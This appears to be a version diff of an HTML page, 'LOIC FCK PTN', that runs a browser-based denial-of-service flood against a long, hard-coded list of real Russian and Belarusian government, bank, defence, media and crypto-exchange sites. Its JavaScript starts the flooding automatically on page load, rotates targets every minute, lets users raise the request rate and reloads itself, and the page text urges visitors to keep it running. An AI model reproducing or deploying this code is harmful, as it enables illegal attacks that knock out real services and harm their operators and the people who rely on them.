@@ -1,103 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>LOIC FCK PTN v1.2</title>
+  <title>LOIC FCK PTN v1.3</title>
   <meta charset="utf-8"/>
   <script>
     "use strict";
-    const servers = [
-      "https://sputnik.by",
-      "https://www.gazprom.ru",
-      "https://lukoil.ru",
-      "https://magnit.ru/",
-      "https://www.nornickel.com/",
-      "https://www.surgutneftegas.ru/",
-      "https://www.tatneft.ru/",
-      "https://www.evraz.com/ru/",
-      "https://nlmk.com/",
-      "https://www.sibur.ru/",
-      "https://www.severstal.com/",
-      "https://www.metalloinvest.com/",
-      "https://nangs.org/",
-      "https://rmk-group.ru/ru/",
-      "https://www.tmk-group.ru/",
-      "https://ya.ru/",
-      "https://www.polymetalinternational.com/ru/",
-      "https://www.uralkali.com/ru/",
-      "https://www.eurosib.ru/",
-      "https://omk.ru/",
-      "https://www.sberbank.ru",
-      "https://www.vtb.ru/",
-      "https://www.gazprombank.ru/",
-      "https://www.gosuslugi.ru/",
-      "https://www.mos.ru/uslugi/",
-      "http://kremlin.ru/",
-      "http://government.ru/",
-      "https://mil.ru/",
-      "https://www.nalog.gov.ru/",
-      "https://customs.gov.ru/",
-      "https://pfr.gov.ru/",
-      "https://rkn.gov.ru/",
-      "https://www.gazprom.ru/",
-      "https://lukoil.ru",
-      "https://magnit.ru/",
-      "https://www.nornickel.com/",
-      "https://www.surgutneftegas.ru/",
-      "https://www.tatneft.ru/",
-      "https://www.evraz.com/ru/",
-      "https://nlmk.com/",
-      "https://www.sibur.ru/",
-      "https://www.severstal.com/",
-      "https://www.metalloinvest.com/",
-      "https://nangs.org/",
-      "https://rmk-group.ru/ru/",
-      "https://www.tmk-group.ru/",
-      "https://ya.ru/",
-      "https://www.polymetalinternational.com/ru/",
-      "https://www.uralkali.com/ru/",
-      "https://www.eurosib.ru/",
-      "https://omk.ru/",
-      "https://www.gosuslugi.ru/",
-      "https://www.mos.ru/uslugi/",
-      "http://kremlin.ru/",
-      "http://government.ru/",
-      "https://mil.ru/",
-      "https://www.nalog.gov.ru/",
-      "https://customs.gov.ru/",
-      "https://pfr.gov.ru/",
-      "https://rkn.gov.ru/",
-      "https://mail.rkn.gov.ru/",
-      "https://cloud.rkn.gov.ru",
-      "https://mvd.gov.ru",
-      "https://pwd.wto.economy.gov.ru/",
-      "https://stroi.gov.ru/",
-      "https://proverki.gov.ru/",
-      "https://belarusbank.by/",
-      "http://www.belta.by/",
-      "https://www.priorbank.by/",
-      "http://www.sb.by/",
-      "https://belarusbank.by/",
-      "https://www.sber-bank.by/sberprime",
-      "https://belapb.by/",
-      "http://sputnik.by/",
-      "http://www.belarus.by/",
-      "http://president.gov.by/",
-      "https://www.priorbank.by/",
-      "https://www.belnovosti.by/",
-      "https://www.gazeta.ru/",
-      "http://kp.ru/",
-      "https://www.mk.ru/",
-      "http://rbc.ru/",
-      "http://ria.ru/",
-      "https://sputnik.by/",
-      "https://yandex.by/",
-      "https://www.yaplakal.com/",
-      "https://belinvestbank.by/individual",
-    ];
+
+    let rqps = 5;
+    let blocksNum = 8;
+
+    const servers =
+        ["https://www.belnovosti.by/", "https://baksman.org/", "https://prostocash.com/", "https://royal.cash/", "https://multichange.net/",
+          "https://ychanger.net/", "https://mine.exchange/", "https://www.gazeta.ru/", "https://www.mk.ru/", "http://rw.by",
+          "http://www.fsb.ru/", "http://www.fsb.ru/", "https://www.rhc.aero/", "http://admship.ru/", "http://www.uralvagonzavod.ru/",
+          "https://www.uecrus.com/rus/", "https://www.uacrussia.ru/ru/",
+          "https://sbi.sberbank.ru:9443/ic/sso/#/login?redirect_uri=htt…nid+sberbankencashment_web&response_type=code&client_id=8313",
+          "https://sputnik.by/", "https://azgaz.ru/", "https://yandex.by/", "https://www.yaplakal.com/",
+          "https://belinvestbank.by/individual", "https://lukoil.ru/", "https://mvdlnr.ru/", "https://www.metalloinvest.com/",
+          "https://shop-rt.com", "https://rkn.gov.ru/", "https://www.sibur.ru/", "https://www.tmk-group.ru/",
+          "https://www.uralkali.com/ru/", "https://ya.ru/", "https://www.024.by/", "https://alfaradio.by/", "https://www.ga23zeta.ru/",
+          "http://mx3.cbr.ru", "https://mx4.cbr.ru", "https://www.belarus.by/", "https://belarus24.by/", "https://belmarket.by/",
+          "http://belta.by/", "http://bezformata.com/", "https://cloud.rkn.gov.ru/", "https://betatransfer.org/", "https://delets.cash/",
+          "https://ww-pay.net/", "https://ramon.money/", "https://platov.co/", "https://coinpaymaster.com/", "https://superchange.net/",
+          "https://bitokk.biz/", "https://www.netex24.net/", "https://changer.club/", "https://cleanbtc.ru/", "https://bonkypay.com/",
+          "https://cashbank.pro/", "https://betatransfer.org/", "https://flashobmen.com/", "https://betatransfer.org/",
+          "https://betatransfer.org/", "https://betatransfer.org/", "https://betatransfer.org/", "https://betatransfer.org/",
+          "https://abcobmen.com/", "https://kupibit.me/", "https://24paybank.ne", "https://abcobmen.com/", "http://www.ctv.by/",
+          "https://grodnonews.by/", "http://kommersant.ru/", "http://kp.ru/", "https://mail.rkn.gov.ru/", "https://www.mil.by/",
+          "https://minsknews.by/", "https://mogilevnews.by/", "https://ont.by/", "https://pikabu.ru/",
+          "https://www.polymetalinternational.com/ru/", "https://proverki.gov.ru/", "https://radiobelarus.by/", "https://radiobrestfm.by/",
+          "https://radiomir.by/", "https://radiostalica.by/", "https://radiusfm.by/", "http://rbc.ru/", "http://ria.ru/",
+          "http://riafan.ru/", "http://portal.rw.by", "https://pass.rw.by/ru/",
+          "https://www.bestchange.ru/tether-trc20-to-visa-mastercard-euro.html", "http://www.salut.ru/", "http://www.almaz-antey.ru/",
+          "https://www.sevmash.ru/", "http://www.ktrv.ru/", "https://kalashnikovgroup.ru/", "http://www.nordsy.spb.ru/",
+          "https://www.moex.com", "https://www.sb.by/", "http://email12.sberbank.ru", "http://email11.sberbank.ru",
+          "https://www.slonves.by/", "https://stroi.gov.ru/", "https://www.tvr.by/", "https://www.tvrmogilev.by/",
+          "https://pwd.wto.economy.gov.ru/", "https://yandex.ru/", "https://zarya.by/", "https://api.developer.sber.ru/product/SberbankID",
+          "https://bankdabrabyt.by/", "https://brrb.by/", "https://www.belapb.by/", "https://belarusbank.by/", "https://bgp.by/ru/",
+          "https://www.belneftekhim.by", "http://www.bellegprom.by", "http://belres.by/ru/", "https://www.energo.by", "https://www.vtb.ru/",
+          "https://www.gazprom.ru/", "https://www.gazprombank.ru/", "http://www.prokuratura.gov.by/", "https://www.gosuslugi.ru/",
+          "https://www.mos.ru/uslugi/", "https://www.evraz.com/ru/", "https://www.eurosib.ru/", "http://www.kgb.by/ru/",
+          "https://magnit.ru/", "https://www.mvd.gov.by/ru", "https://mil.ru/", "https://www.mil.by/", "https://www.nalog.gov.ru/",
+          "http://www.nbrb.by/", "https://nlmk.com/", "https://nangs.org/", "https://www.nornickel.com/", "https://omk.ru/",
+          "https://glava-lnr.info/", "https://pfr.gov.ru/", "http://www.government.by/", "http://government.ru/", "http://kremlin.ru/",
+          "https://rmk-group.ru/ru/", "https://mvd.gov.ru/", "https://www.sberbank.ru/", "https://www.severstal.com/",
+          "https://www.surgutneftegas.ru/", "https://customs.gov.ru/", "https://www.tatneft.ru/", "https://rec.gov.by/ru",
+          "https://sputnik.by", "https://www.gazprom.ru", "https://lukoil.ru", "https://www.sberbank.ru", "https://cloud.rkn.gov.ru",
+          "https://mvd.gov.ru", "http://www.belta.by/", "https://www.priorbank.by/", "http://www.sb.by/",
+          "https://www.sber-bank.by/sberprime", "https://belapb.by/", "http://sputnik.by/", "http://www.belarus.by/",
+          "http://president.gov.by/"];
 
     function pickOne(index) {
       var ctr = Math.floor(Math.random() * servers.length);
-      LOIC(servers[ctr], 10, index)
+      LOIC(servers[ctr], rqps, index)
     }
 
     function generateId() {
@@ -112,43 +67,35 @@
     function LOIC(target, requestsPerSecond, index) {
       var isFiring = false;
       var fireInterval = null;
-      var onFail = function () {
-        increment("failed", index);
-      };
-      var onSuccess = function () {
-        increment("succeeded", index);
-      };
-      var onRequest = function () {
-        increment("requests", index);
-      };
+
       var DoS = function () {
         var image = new Image();
         image.onerror = function () {
-          onFail();
+          increment("failed", index);
         };
         image.onabort = function () {
-          onFail();
+          increment("failed", index);
         };
         image.onload = function () {
-          onSuccess();
+          increment("succeeded", index);
         }
         image.src = target + "?" + generateId() + "=" + Math.floor(Math.random() * 1000);
-        onRequest();
+        increment("requests", index);
       };
       document.getElementsByClassName("target")[index].value = target;
       if (fireInterval) {
         clearInterval(fireInterval);
       }
-      document.getElementsByClassName("button")[index].onclick = null;
-      document.getElementsByClassName("button")[index].onclick = function () {
+      document.getElementsByClassName("btn-flood")[index].onclick = null;
+      document.getElementsByClassName("btn-flood")[index].onclick = function () {
         if (isFiring) {
           clearInterval(fireInterval);
           isFiring = false;
-          document.getElementsByClassName("button")[index].innerHTML = "Flood";
+          document.getElementsByClassName("btn-flood")[index].innerHTML = "Flood";
           document.getElementsByClassName("status")[index].innerHTML = "Not Running";
         } else {
           isFiring = true;
-          document.getElementsByClassName("button")[index].innerHTML = "Stop Flood";
+          document.getElementsByClassName("btn-flood")[index].innerHTML = "Stop Flood";
           document.getElementsByClassName("status")[index].innerHTML = "Running";
           fireInterval = setInterval(DoS, (1000 / parseInt(requestsPerSecond) | 0));
         }
@@ -156,124 +103,199 @@
     }
   </script>
   <style>
+      h1 {
+          color: whitesmoke;
+          text-align: center;
+      }
+
+      h2 {
+          margin-top: 2rem;
+      }
+
+      p {
+          text-align: center;
+      }
+
+      a {
+          color: aquamarine;
+      }
+
+      html,
       body {
-          background-color: black;
-          color: lime;
-          font-family: Impact, fantasy;
+          height: fit-content;
           width: 100%;
       }
 
-      input, button {
-          width: 300px;
-          margin-top: 1rem;
-          margin-bottom: 1rem;
+      body {
+          color: navajowhite;
+          font: monospace;
+          box-sizing: border-box;
+          background: linear-gradient(to bottom right, black, steelblue);
+          overflow-X: hidden;
       }
 
-      button {
-          padding: 2rem;
+      body > div {
+          width: 100%;
+          padding: 1rem;
+          text-align: center;
+      }
+
+      .heading {
+          padding: 1rem;
+          height: 200px;
+          background-position: center;
+          background-repeat: no-repeat;
+          background-image: url(https://ddosmonitor.herokuapp.com/img/big-flag.webp);
+          border-radius: 2rem;
+          display: inline-block;
+      }
+
+      .heading h1 {
+          margin-bottom: 4rem;
+      }
+
+      .heading-blue {
+          color: #375a81;
+          font-weight: bolder;
+      }
+
+      input, .btn-flood {
+          color: black;
+          width: 70%;
+          margin-top: 1rem;
+          margin-bottom: 1rem;
+          padding: 0.5rem;
+      }
+
+      input {
+          background: #aaa !important;
+          font-size: 70%;
       }
 
       .sleeper {
-          width: 24%;
+          width: 22%;
           display: inline-block;
           padding: 2rem 0rem;
+          margin-left: 1rem;
+          margin-top: 1rem;
+          border-radius: 2rem;
       }
 
-      .blue, .blue * {
-          color: white;
-          background-color: #0057B8;
+      .blue, .blue .btn-flood {
+          color: #aaa;
+          background-color: #375a81;
       }
 
-      .yellow, .yellow * {
+      .yellow, .yellow .btn-flood {
           color: #333;
-          background-color: #FFD700;
+          background-color: #b3a34d;
       }
   </style>
 </head>
 <body>
-<h1 align="center">
-  LOIC FCK PTN v1.2
-</h1>
-<h2>Keep this page open to keep the "attacks" running, reload once per day to get updated lists of servers to target!</h2>
-<div class="sleeper blue">
-  <center>
-    <input class="target" name="target" readonly type="url"/>
-    <button class="button" name="button">Flood</button>
-    <br/>
-    Requests: <span class="requests">0</span>
-    <br/>
-    Succeeded: <span class="succeeded">0</span>
-    <br/>
-    Failed: <span class="failed">0</span>
-    <br/>
-    Status: <span class="status">Not Running</span>
-  </center>
-</div>
-<div class="sleeper yellow">
-  <center>
-    <input class="target" name="target" readonly type="url"/>
-    <button class="button" name="button">Flood</button>
-    <br/>
-    Requests: <span class="requests">0</span>
-    <br/>
-    Succeeded: <span class="succeeded">0</span>
-    <br/>
-    Failed: <span class="failed">0</span>
-    <br/>
-    Status: <span class="status">Not Running</span>
-  </center>
-</div>
-<div class="sleeper blue">
-  <center>
-    <input class="target" name="target" readonly type="url"/>
-    <button class="button" name="button">Flood</button>
-    <br/>
-    Requests: <span class="requests">0</span>
-    <br/>
-    Succeeded: <span class="succeeded">0</span>
-    <br/>
-    Failed: <span class="failed">0</span>
-    <br/>
-    Status: <span class="status">Not Running</span>
-  </center>
-</div>
-<div class="sleeper yellow">
-  <center>
-    <input class="target" name="target" readonly type="url"/>
-    <button class="button" name="button">Flood</button>
-    <br/>
-    Requests: <span class="requests">0</span>
-    <br/>
-    Succeeded: <span class="succeeded">0</span>
-    <br/>
-    Failed: <span class="failed">0</span>
-    <br/>
-    Status: <span class="status">Not Running</span>
-  </center>
-</div>
-<script>
-  var btns = document.getElementsByClassName("button");
-
-  function clickBtns() {
-    for (var i = 0; i < btns.length; i++) {
-      btns[i].click();
+<div>
+  <div class="heading">
+    <h1>LOIC FCK PTN v1.3</h1>
+    <p class="heading-blue">Keep this page open to keep the "attacks" running</p>
+    <p class="heading-blue">Reload once per day to get updated lists of servers to target!</p>
+  </div>
+  <div></div>
+  <script>
+    for (var i = 0; i < blocksNum; i++) {
+      document.writeln('<div class="sleeper ' + (i % 2 === 0 ? 'blue' : 'yellow') + '">');
+      document.writeln('<input class="target" readOnly type="url"/>');
+      document.writeln('<button class="btn-flood">Flood</button><br/>');
+      document.writeln('Requests: <span class="requests">0</span><br/>');
+      document.writeln('Succeeded: <span class="succeeded">0</span><br/>');
+      document.writeln('Failed: <span class="failed">0</span><br/>');
+      document.writeln('Status: <span class="status">Not Running</span>');
+      document.writeln('</div>');
     }
-  }
+  </script>
 
-  function triggerHell() {
-    if (document.getElementsByClassName("button")[0].textContent == 'Stop Flood') {
-      clickBtns();
+
+  <h2>How does this work?</h2>
+  <p>This site uses a JS LOIC script to locally run Denial of Service attacks to a list of targets from your own hardware.
+    Four targets are chosen (and automatically switched every minute) to reduce the load on your hardware,
+    and to ensure targets are "evenly" distributed.
+    This has the potential to be much more decentralized attack than a traditional DoS attack would be,
+    with each node/server being a user on the site.
+    This makes it almost impossible to blacklist IPs to stop the attacks, as there are as many unique IPs (your own machine) as there are
+    users on the site.
+  </p>
+
+  <h2>My machine is to weak / strong for this script?</h2>
+  <form action="index.html" method="GET">
+    <select id="rqps" name="rqps">
+      <option value="5">I have an old / weak / cheap PC or a mobile device</option>
+      <option value="10">I have a modern / normal PC or a hi end mobile device</option>
+      <option value="30">I have a beast with 32GB, latest CPU</option>
+      <option value="100">All of previous and you don't need to work on it, so go lightspeed!</option>
+    </select>
+    <button type="submit">Reload</button>
+  </form>
+
+  <h2>Important Notices:</h2>
+  <p>If the target server is down, the success counter may display 0. This is completely normal, due to the server not being
+    able to respond to your request.</p>
+  <p>For the same reason, the failed counter may also lag behind, due to unresponsive servers THIS IS A GOOD SIGN!.</p>
+  <p>The LOIC script is currently preset to 5 R/S per block to accommodate users with lower-end hardware. In order to
+    contribute more power, you may open up more tabs, or select a different hadrware in the selection box above to increase your fire rate
+    ;)</p>
+  <h2>Changelog:</h2>
+  <p>v1.3 ui theme revised, added selector to choose request load for different models of PCs, auto reload every 8 hours</p>
+  <p>see <a href="https://github.com/eitzenbe/StandWithUkraine">Our github repo</a></p>
+
+  <script>
+
+
+    if (window.location.href.indexOf('rqps=') === -1) {
+      alert('Welcome! Please note that your bandwidth and computational resources will be used to assist Ukraine\'s efforts' +
+        ' in countering Russia\'s threats to their sovereignty. Please be aware that this could be illegal in your country.' +
+        'Thank you so much for helping!');
     }
-    pickOne(0);
-    pickOne(1);
-    pickOne(2);
-    pickOne(3);
-    setTimeout(clickBtns, 1000);
-  }
 
-  setInterval(triggerHell, 60000);
-  triggerHell();
-</script>
-<p align="center">&copy; JS LOIC - Thanx for the base script</p>
+    var btns = document.getElementsByClassName("btn-flood");
+
+    function clickBtns() {
+      for (var i = 0; i < btns.length; i++) {
+        btns[i].click();
+      }
+    }
+
+    function triggerHell() {
+      if (document.getElementsByClassName("btn-flood")[0].textContent == 'Stop Flood') {
+        clickBtns();
+      }
+      for (var i = 0; i < blocksNum; i++) {
+        pickOne(i);
+      }
+      setTimeout(clickBtns, 1000);
+    }
+
+    try {
+      rqps = Number(window.location.href.split("rqps=")[1]);
+    } catch (ignored) {
+      // all fine
+    }
+    if (isNaN(rqps) || rqps < 5) {
+      rqps = 5;
+    }
+    document.getElementById("rqps").value = rqps;
+
+    setInterval(triggerHell, 60000);
+    triggerHell();
+
+    setTimeout(function () {
+      let char = '?';
+      if (window.location.href.indexOf('?') !== -1) {
+        char = '&';
+      }
+      window.location.href = window.location.href + char + 'trigger=' + (+new Date()) + '&rqps=' + rqps;
+    }, 8*3600*1000);
+  </script>
+  <p align="center">&copy; JS LOIC - Thanx for the base script</p>
+
+</div>
 </body>
 </html>
